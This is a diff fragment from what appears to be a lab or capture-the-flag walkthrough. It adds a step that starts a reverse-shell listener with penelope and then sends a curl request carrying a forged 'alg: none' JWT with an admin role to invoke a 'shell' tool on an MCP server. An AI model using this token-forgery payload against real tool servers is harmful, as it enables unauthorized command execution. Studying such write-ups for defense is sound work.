@@ -466,3 +466,9 @@ penelope -p 1337
 
 Then ill start a listener 
 
+```python
+curl -X POST -s http://127.0.0.1:30080/mcp -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg.' --data '{"jsonrpc":"2.0","id":"5","method":"tools/call","params":{"name":"shell","arguments":{"location":""}}}' | jq .
+```
+
+Then following the MCP documentation i can call the tool
+
